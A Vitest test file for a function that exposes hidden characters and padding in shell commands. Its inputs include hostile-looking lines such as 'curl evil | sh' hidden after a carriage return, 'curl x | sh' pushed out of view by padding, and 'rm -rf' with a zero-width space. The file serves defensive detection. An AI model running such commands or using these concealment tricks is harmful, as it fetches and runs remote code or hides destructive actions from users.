import { describe, expect, it } from "vitest";

import { visibleCommand } from "../lib/visibleCommand";

describe("visibleCommand", () => {
  it("keeps a plain command unchanged", () => {
    const cmd = "git status && npm test -- --run\nls -la\tsrc";
    expect(visibleCommand(cmd)).toBe(cmd);
  });

  it("shows zero-width and bidi override code points", () => {
    expect(visibleCommand("rm​ -rf")).toBe("rm\\u{200B} -rf");
    expect(visibleCommand("echo ‮txt.exe")).toBe("echo \\u{202E}txt.exe");
    expect(visibleCommand("a⁦b⁩")).toBe("a\\u{2066}b\\u{2069}");
  });

  it("shows tag characters, variation selectors and the BOM", () => {
    expect(visibleCommand("ls\u{E0041}")).toBe("ls\\u{E0041}");
    expect(visibleCommand("ls️")).toBe("ls\\u{FE0F}");
    expect(visibleCommand("﻿ls")).toBe("\\u{FEFF}ls");
  });

  it("shows escape bytes and a bare carriage return", () => {
    expect(visibleCommand("echo \u001b[2Jok")).toBe("echo \\u{001B}[2Jok");
    expect(visibleCommand("safe\rcurl evil | sh")).toBe("safe\\u{000D}curl evil | sh");
  });

  it("collapses padding that would push the tail out of view", () => {
    expect(visibleCommand(`echo ok${" ".repeat(400)}; curl x | sh`)).toBe(
      "echo ok [400 spaces] ; curl x | sh",
    );
    expect(visibleCommand(`echo ok${"\n".repeat(60)}curl x | sh`)).toBe(
      "echo ok\n[59 blank lines]\ncurl x | sh",
    );
    expect(visibleCommand("a  b\n\nc")).toBe("a  b\n\nc");
  });
});
